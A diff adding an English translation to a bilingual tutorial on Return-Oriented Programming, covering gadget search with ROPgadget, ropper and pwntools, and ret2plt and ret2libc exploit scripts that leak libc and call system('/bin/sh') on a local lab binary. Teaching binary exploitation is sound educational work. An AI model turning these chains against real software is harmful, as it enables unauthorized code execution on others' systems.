@@ -1,3 +1,9 @@
+> 🌐 **Language / 언어**: [🇰🇷 한국어](#한국어) | [🇺🇸 English](#english)
+
+---
+
+<a name="한국어"></a>
+
 # ROP(Return-Oriented Programming) 체인 구성
 
 ## 개요
@@ -340,3 +346,142 @@ context.log_level = "debug"
 | puts가 짧게 읽힘 | `\x0a` 개행 문자로 끊김 | `recvuntil`, `recvline` 조합 |
 | 주소에 null 바이트 | `\x00` 전달 불가 | PLT leak으로 우회 |
 | ASLR bypass 실패 | 브루트포스 필요 | fork 서버 환경 활용 |
+
+---
+
+<a name="english"></a>
+
+# ROP (Return-Oriented Programming) Chain Construction
+
+## Overview
+
+In modern binary exploitation, ROP (Return-Oriented Programming) is used to bypass NX/DEP (Non-Executable memory). Instead of injecting code, it reuses existing code snippets (gadgets) already present in executable memory regions (binary, libc, etc.).
+
+```
+Traditional Shellcode:
+  Overflow → Inject shellcode → Execute
+  Blocked by: NX/DEP
+
+ROP Chain:
+  Overflow → Chain existing code gadgets → Execute system("/bin/sh")
+  Bypasses: NX/DEP (using existing executable code)
+  Still blocked by: ASLR (need address leak)
+```
+
+---
+
+## 1. Finding ROP Gadgets
+
+```bash
+# ROPgadget
+ROPgadget --binary ./vuln | grep "pop rdi"
+ROPgadget --binary ./vuln | grep ": ret$"
+ROPgadget --binary ./vuln --rop --badbytes "0a00"
+
+# ropper
+ropper -f ./vuln --search "pop rdi"
+ropper -f ./vuln --chain execve
+
+# pwntools built-in
+from pwn import ROP, ELF
+elf = ELF('./vuln')
+rop = ROP(elf)
+rop.find_gadget(['pop rdi', 'ret'])
+```
+
+---
+
+## 2. ret2plt — Call Library Functions
+
+```python
+from pwn import *
+
+binary = ELF('./vuln')
+libc = ELF('./libc.so.6')
+
+def exploit():
+    p = process('./vuln')
+    
+    # Find gadgets
+    rop = ROP(binary)
+    pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
+    ret_gadget = rop.find_gadget(['ret'])[0]  # Stack alignment
+    
+    # Build ROP chain
+    payload = b'A' * offset          # Fill to return address
+    payload += p64(pop_rdi)          # pop rdi; ret
+    payload += p64(next(binary.search(b'/bin/sh\x00')))  # "/bin/sh" address
+    payload += p64(ret_gadget)       # Stack alignment (16-byte)
+    payload += p64(binary.plt['system'])  # system()
+    
+    p.sendline(payload)
+    p.interactive()
+```
+
+---
+
+## 3. ret2libc — ASLR Bypass
+
+```python
+from pwn import *
+
+binary = ELF('./vuln')
+libc = ELF('./libc.so.6')
+
+def leak_libc(p, payload_gen):
+    """Leak libc address via puts/printf"""
+    
+    rop = ROP(binary)
+    pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
+    
+    # Leak puts address
+    leak_payload = b'A' * offset
+    leak_payload += p64(pop_rdi)
+    leak_payload += p64(binary.got['puts'])  # Address of puts in GOT
+    leak_payload += p64(binary.plt['puts'])  # Call puts to print the address
+    leak_payload += p64(binary.symbols['main'])  # Return to main for second exploit
+    
+    p.sendline(leak_payload)
+    p.recvuntil(b'\n')
+    
+    # Parse leaked address
+    leaked = u64(p.recv(6).ljust(8, b'\x00'))
+    libc_base = leaked - libc.symbols['puts']
+    
+    print(f"[+] libc base: {hex(libc_base)}")
+    return libc_base
+
+def exploit():
+    p = process('./vuln')
+    
+    libc_base = leak_libc(p, None)
+    
+    # Calculate actual addresses
+    system = libc_base + libc.symbols['system']
+    bin_sh = libc_base + next(libc.search(b'/bin/sh'))
+    
+    rop = ROP(binary)
+    pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
+    ret_gadget = rop.find_gadget(['ret'])[0]
+    
+    # Second payload: call system("/bin/sh")
+    final_payload = b'A' * offset
+    final_payload += p64(pop_rdi)
+    final_payload += p64(bin_sh)
+    final_payload += p64(ret_gadget)
+    final_payload += p64(system)
+    
+    p.sendline(final_payload)
+    p.interactive()
+```
+
+---
+
+## 4. Common Issues and Solutions
+
+| Issue | Cause | Solution |
+|-------|-------|---------|
+| Segfault at movaps | Stack not 16-byte aligned | Add one extra `ret` gadget |
+| puts truncated | `\x0a` newline character cuts off | Use `recvuntil`, `recvline` combination |
+| Null bytes in address | Cannot pass `\x00` | Bypass via PLT leak |
+| ASLR bypass fails | Brute force needed | Utilize fork server environment |
